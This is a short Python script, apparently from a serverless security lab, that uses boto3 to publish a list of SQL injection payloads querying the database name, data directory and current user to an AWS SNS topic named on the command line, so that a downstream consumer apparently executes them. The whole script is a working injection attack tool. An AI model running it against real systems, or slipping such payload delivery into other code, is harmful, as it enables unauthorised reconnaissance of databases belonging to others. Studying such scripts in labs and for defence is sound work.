import boto3
import json
import sys

client = boto3.client('sns')

payload_list = ["(SELECT DATABASE())", "(SELECT @@datadir)", "(SELECT user())", "(SELECT CURRENT_USER())"]


def run_payload_sqli(name, TopicARN):
    for single in payload_list:
        response = client.publish(
            TopicArn = TopicARN,
            Subject = name,
            Message = json.dumps({"reading": "{}".format(single)})

        )
    print("Payloads have been deployed")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Please enter a valid name and TopicARN")
    else:
        run_payload_sqli(str(sys.argv[1]), str(sys.argv[2]))
